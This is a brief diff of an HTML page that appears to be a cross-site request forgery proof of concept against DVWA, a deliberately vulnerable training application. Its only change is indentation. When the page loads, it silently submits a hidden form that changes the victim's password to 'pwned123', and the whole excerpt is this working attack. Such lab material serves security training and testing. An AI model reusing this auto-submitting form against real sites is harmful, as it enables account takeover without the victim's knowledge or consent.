@@ -1,7 +1,7 @@
 <!doctype html>
 <html>
   <body onload="document.forms[0].submit()">
-  <form action="http://dvwa:4040/vulnerabilities/csrf/" method="GET">
+    <form action="http://dvwa:4040/vulnerabilities/csrf/" method="GET">
       <input type="hidden" name="password_new" value="pwned123">
       <input type="hidden" name="password_conf" value="pwned123">
       <input type="hidden" name="Change" value="Change">
